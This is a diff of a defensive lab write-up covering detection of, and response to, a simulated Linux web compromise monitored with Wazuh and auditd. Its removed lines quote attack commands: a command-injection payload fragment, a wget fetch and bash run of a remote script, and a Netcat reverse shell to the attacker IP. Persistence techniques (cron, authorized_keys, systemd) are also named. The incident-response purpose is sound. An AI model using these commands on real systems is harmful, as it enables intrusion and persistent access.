@@ -1,16 +1,16 @@
-# 🚨 Detection and Response to DVWA Command Injection RCE (Wazuh + Auditd)
+# 🚨 Detection and Response to Linux Persistence and Suspicious Command Execution (Wazuh + Auditd)
 
 ---
 
 ## 📌 Overview
 
-Simulation of a Remote Command Execution (RCE) attack through DVWA Command Injection, resulting in remote shell access, persistence creation, and post-exploitation activity.
+Simulation of a Linux compromise involving command execution, persistence mechanisms, suspicious process activity, and live incident response investigation.
 
 - Access: ✔  
 - Execution: ✔  
 - Persistence: ✔  
-- Evasion: ❌  
-- Severity: 🔴 9/10 (Critical)  
+- Evasion: ✔  
+- Severity: 🔴 8/10 (High)
 
 ---
 
@@ -22,195 +22,331 @@ Simulation of a Remote Command Execution (RCE) attack through DVWA Command Injec
 
 ## 🖥️ Environment
 
-- Attacker: `192.168.18.226`  
-- Target: `192.168.122.171`  
-- SIEM: Wazuh + Auditd  
-- Service: Apache2 / DVWA  
+- Attacker: `192.168.18.226`
+- Target: `WEB-01`
+- SIEM: `Wazuh`
+- Monitoring: `auditd`
+- Service: `Apache2`
+- Operating System: `Ubuntu Linux`
 
 ---
 
 ## 🎯 Attack Scenario
 
-A vulnerable DVWA Command Injection endpoint was exploited to execute arbitrary Linux commands on the target host.
+A simulated attacker achieved remote command execution through a vulnerable web application running under the `www-data` context.
 
-The attacker established a reverse shell connection through Netcat, gaining remote command execution as the `www-data` user. After initial access, persistence artifacts were created in `/tmp`, including simulated cron jobs, SSH authorized_keys persistence, and a fake systemd service.
+After execution, multiple suspicious commands were executed to simulate post-exploitation behavior, persistence establishment, and attacker activity validation.
 
-Post-exploitation activity was monitored through `auditd` process execution logging and host-based investigation techniques.
+Persistence mechanisms included:
 
----
-
-## 🔍 Detection
-
-Detection occurred through Linux `auditd` telemetry integrated with Wazuh monitoring. Suspicious commands such as `curl`, `wget`, `chmod`, and `bash` were captured through EXECVE events.
-
-![Detection](./images/14_auditd_execve_logs.png)
-
-- Rule ID: `exec_monitor`  
-- Detection logic: Monitoring suspicious command execution through auditd EXECVE events  
+- Cron persistence
+- SSH authorized_keys persistence
+- Systemd service persistence
 
 ---
 
-## 🧠 Investigation
+## ⚠️ Initial Access
 
-![Evidence](./images/06_threat_activity.png)
+![Initial Access](./images/01_dvwa_rce_www-data.png)
 
-### Evidence:
-
-- Source IP: `192.168.18.226`  
-- Endpoint / Service: `/DVWA/vulnerabilities/exec/`  
-- Parameter / Vector: `ip=` command injection parameter  
-- Reverse shell activity observed  
-- Persistence artifacts identified in `/tmp`  
-- Outbound network connection to attacker host detected  
+The attacker successfully executed commands via the vulnerable web application context (`www-data`).
 
 ---
 
-## 🔎 Indicators of Compromise (IoCs)
+## 🐚 Reverse Shell Activity
+
+![Reverse Shell](./images/02_reverse_shell_www-data.png)
+
+A reverse shell connection was established to simulate attacker interactive access.
+
+---
+
+## 🔎 Initial Enumeration
+
+![Enumeration](./images/03_initial_enumeration_www-data.png)
+
+The attacker performed local enumeration to identify privileges, processes, and accessible resources.
+
+---
+
+## 🌐 Network and Process Enumeration
+
+![Network Enumeration](./images/04_web_process_and_network_enum.png)
+
+Post-exploitation activity included process inspection and network visibility checks.
+
+---
+
+## 📄 Apache Log Evidence
+
+![Apache Evidence](./images/05_apache_log_evidence.png)
+
+Web application logs recorded suspicious activity associated with command execution attempts.
+
+---
+
+# 🔍 Detection
+
+Detection occurred through:
+
+- `auditd` EXECVE monitoring
+- Process inspection
+- File artifact analysis
+- Persistence hunting
+- Manual live response investigation
+
+![Detection](./images/07_auditd_execve_detection.png)
+
+### Detection Logic
+
+Suspicious command execution involving:
+
+- `curl`
+- `wget`
+- `chmod`
+- `bash`
+
+---
+
+## 🚨 Threat Activity Simulation
+
+![Threat Activity](./images/06_threat_activity_simulation.png)
+
+Suspicious commands executed:
+
+- Remote file retrieval
+- Bash execution
+- Permission modification
+- Persistent outbound connection attempts
+
+---
+
+# 🧠 Investigation
+
+## 🔎 Host IoCs Collection
+
+![Host IoCs](./images/08_host_iocs_collection.png)
+
+Artifacts identified:
+
+- Malicious cron file
+- Fake SSH authorized_keys
+- Systemd persistence service
+- Suspicious scripts in `/tmp`
+
+---
+
+## 👤 Authentication Investigation
+
+![Authentication IoCs](./images/09_authentication_iocs.png)
+
+Active sessions and compromised user context were identified during investigation.
+
+---
+
+## 📚 Login History Analysis
+
+![Login History](./images/10_lastlog_analysis.png)
+
+Historical login activity was reviewed using:
+
+- `last`
+- `who`
+- `w`
+
+---
+
+## 🔐 Persistence IoCs
+
+![Persistence IoCs](./images/11_persistence_iocs.png)
+
+Persistence mechanisms identified:
+
+- Cron persistence
+- SSH key persistence
+- Systemd service persistence
+
+---
+
+## ⚙️ Process Investigation
+
+![Process IoCs](./images/12_process_iocs.png)
+
+Suspicious processes and active execution chains were analyzed during live response.
+
+---
+
+## 🌳 Process Tree Analysis
+
+![Process Tree](./images/13_process_tree.png)
+
+Parent-child process relationships were inspected to understand execution flow and persistence behavior.
+
+---
+
+## 📜 Auditd Command Evidence
+
+![Auditd Evidence](./images/14_auditd_execve_logs.png)
+
+`auditd` successfully captured EXECVE events related to attacker activity.
+
+---
+
+## 🚨 Suspicious Command Detection
+
+![Suspicious Commands](./images/15_suspicious_execve_commands.png)
+
+Captured suspicious commands:
+
+- `curl`
+- `wget`
+- `bash`
+- `chmod`
+
+---
+
+# 🔎 Indicators of Compromise (IoCs)
 
 | Category | Indicator | Description | MITRE |
 |----------|----------|------------|-------|
-| Network | `192.168.18.226` | Attacker IP | [T1190](https://attack.mitre.org/techniques/T1190/) |
-| Network | `4444` | Reverse shell listener port | [T1071](https://attack.mitre.org/techniques/T1071/) |
-| Application | `/DVWA/vulnerabilities/exec/` | Vulnerable endpoint | [T1190](https://attack.mitre.org/techniques/T1190/) |
-| Application | `127.0.0.1; bash -c ...` | Command injection payload | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
-| Behavior | `curl/wget/bash/chmod` | Suspicious execution chain | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
-| Host | `/tmp/update.sh` | Persistent artifact | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
-| Host | `/tmp/web-update.service` | Fake systemd persistence | [T1543.002](https://attack.mitre.org/techniques/T1543/002/) |
-| Host | `authorized_keys` | SSH persistence artifact | [T1098](https://attack.mitre.org/techniques/T1098/) |
-| Detection | `auditd EXECVE` | Process execution telemetry | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
-| Response | Process investigation | Threat hunting and validation | N/A |
+| Network | `192.168.18.226` | Attacker IP | [T1071](https://attack.mitre.org/techniques/T1071/) |
+| Host | `/tmp/update.sh` | Suspicious script | [T1059](https://attack.mitre.org/techniques/T1059/) |
+| Host | `backup_cron` | Cron persistence | [T1053.003](https://attack.mitre.org/techniques/T1053/003/) |
+| Host | `authorized_keys` | SSH persistence | [T1098.004](https://attack.mitre.org/techniques/T1098/004/) |
+| Host | `web-update.service` | Systemd persistence | [T1543.002](https://attack.mitre.org/techniques/T1543/002/) |
+| Process | `curl/wget/bash/chmod` | Suspicious execution chain | [T1059](https://attack.mitre.org/techniques/T1059/) |
+| Detection | EXECVE events | auditd monitoring | [T1059](https://attack.mitre.org/techniques/T1059/) |
 
 ---
 
-## 🔎 Command / Activity Evidence
+# ⚠️ Detection Context
 
-![Commands](./images/15_suspicious_execve_commands.png)
+## Wazuh Troubleshooting
 
-- `curl http://test.com`
-- `wget http://test.com/a.sh`
-- `chmod +x /tmp/test.sh`
-- `bash /tmp/test.sh`
-- `nc -nv 192.168.18.226 4444`
-- `systemctl enable web-update.service`
+![Wazuh Missing Alerts](./images/16_wazuh_alerts_missing.png)
 
----
+During investigation, the expected Wazuh alert file was not available.
 
-## ⚠️ Impact Assessment
+This required manual investigation using:
 
-- **Access Level:** Remote Command Execution  
-- **Privilege Level:** `www-data`  
-- **Scope:** Single Linux web server  
-- **Exposure:** Web application execution context and local host access  
+- `auditd`
+- Process analysis
+- File system inspection
+- Live response techniques
 
-### Severity: 🔴 9/10 (Critical)
-
-**Justification:**
-- Remote code execution confirmed  
-- Reverse shell established  
-- Persistence mechanisms simulated  
-- Post-exploitation activity validated  
-- Host-level command execution achieved  
-
-→ The attack demonstrated full remote command execution capabilities against a public-facing web application with persistence simulation and post-exploitation behavior.
+This scenario demonstrates realistic SOC troubleshooting and telemetry validation workflows.
 
 ---
 
-## 🛡️ Response
+# ⚠️ Impact Assessment
 
-### Containment
+- **Access Level:** Remote Command Execution
+- **Privilege Level:** `www-data`
+- **Scope:** Single Linux host
+- **Exposure:** Command execution, persistence creation, suspicious outbound activity
 
-![Containment](./images/09_authentication_iocs.png)
+### Severity: 🔴 8/10 (High)
 
-- Suspicious sessions identified  
-- Malicious processes investigated  
-- Reverse shell activity validated  
-- Persistence artifacts enumerated  
+### Justification
 
----
-
-### Eradication
-
-- Remove malicious files from `/tmp`
-- Remove fake cron persistence
-- Remove fake authorized_keys artifact
-- Remove fake systemd service
-- Disable vulnerable DVWA instance
-- Block outbound reverse shell connections
+- Multiple persistence techniques established
+- Interactive shell simulation executed
+- Suspicious command execution confirmed
+- Host compromise indicators identified
+- Outbound communication attempts observed
 
 ---
 
-### Recovery
+# 🛡️ Response
 
-![Validation](./images/13_process_tree.png)
+## Containment
 
-- System activity validated after investigation  
-- No additional malicious sessions observed  
-- Process tree analysis completed  
-
----
-
-### 🔐 Hardening
-
-- Restrict command execution on web applications  
-- Disable dangerous PHP functions  
-- Enable stricter auditd monitoring  
-- Implement WAF protections  
-- Harden Apache/PHP configuration  
-- Restrict outbound server communication  
-- Improve Linux process monitoring rules  
+- Suspicious processes identified
+- Persistence mechanisms isolated
+- Host artifacts documented
 
 ---
 
-### ✅ Defense Validation
+## Eradication
 
-- Suspicious commands detected via auditd  
-- Reverse shell behavior investigated  
-- Persistence artifacts identified successfully  
-- MITRE ATT&CK mapping completed  
-- Host telemetry collection validated  
+- Malicious persistence artifacts removed
+- Suspicious scripts deleted
+- SSH persistence invalidated
 
 ---
 
-## 🧬 MITRE ATT&CK
+## Recovery
+
+- System integrity validated
+- Persistence mechanisms removed
+- Monitoring maintained
+
+---
+
+## 🔐 Hardening
+
+- Enable continuous auditd monitoring
+- Improve Wazuh telemetry validation
+- Restrict unnecessary shell execution
+- Monitor `/tmp` execution activity
+- Harden SSH configuration
+- Implement persistence detection use cases
+
+---
+
+## ✅ Defense Validation
+
+- Persistence successfully identified
+- EXECVE monitoring validated
+- Suspicious commands detected
+- Investigation workflow completed
+
+---
+
+# 🧬 MITRE ATT&CK
 
 | Technique ID | Technique Name | Description |
 |-------------|--------------|------------|
-| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | Exploitation of DVWA command injection vulnerability |
-| [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell | Execution of Linux shell commands |
-| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Download activity using curl/wget |
-| [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Cron | Simulated cron persistence |
-| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | authorized_keys persistence |
-| [T1543.002](https://attack.mitre.org/techniques/T1543/002/) | Systemd Service | Fake malicious service persistence |
-| [T1071](https://attack.mitre.org/techniques/T1071/) | Application Layer Protocol | Reverse shell communication |
+| [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter | Bash command execution |
+| [T1053.003](https://attack.mitre.org/techniques/T1053/003/) | Cron | Cron persistence |
+| [T1098.004](https://attack.mitre.org/techniques/T1098/004/) | SSH Authorized Keys | SSH persistence |
+| [T1543.002](https://attack.mitre.org/techniques/T1543/002/) | Systemd Service | Service persistence |
+| [T1071](https://attack.mitre.org/techniques/T1071/) | Application Layer Protocol | Outbound connection attempts |
 
 ---
 
-## 🎯 Conclusion
+# 🎯 Conclusion
 
 Detection → Investigation → Classification → Response
 
-This lab simulated a realistic Linux web exploitation scenario involving DVWA Command Injection leading to Remote Code Execution (RCE), reverse shell establishment, persistence simulation, and host-based forensic investigation.
+This lab simulated a realistic Linux compromise involving command execution, persistence creation, suspicious process activity, and live forensic investigation.
 
-The investigation validated malicious process execution, suspicious network activity, persistence artifacts, and post-exploitation behavior using Linux telemetry and auditd monitoring techniques.
+The investigation validated practical SOC analyst skills involving:
 
----
-
-## 🧠 Skills Developed
-
-- Linux DFIR investigation  
-- Web attack analysis  
-- Reverse shell investigation  
-- Auditd monitoring and telemetry  
-- Process tree analysis  
-- Threat hunting  
-- IOC collection and validation  
-- MITRE ATT&CK mapping  
-- Linux persistence investigation  
-- Incident response workflow  
+- auditd monitoring
+- persistence hunting
+- process investigation
+- IoC collection
+- live response analysis
+- MITRE ATT&CK mapping
 
 ---
 
-## 📞 Contact
+# 🧠 Skills Developed
+
+- Linux incident response
+- auditd investigation
+- Wazuh troubleshooting
+- Persistence hunting
+- Process analysis
+- IoC collection
+- MITRE ATT&CK mapping
+- Threat investigation
+- Live response workflow
+
+---
+
+# 📞 Contact
 
 LinkedIn: https://www.linkedin.com/in/tiagokrysiaki/  
-GitHub: https://github.com/TKrysiaki
+GitHub: https://github.com/TiagoKrysiaki
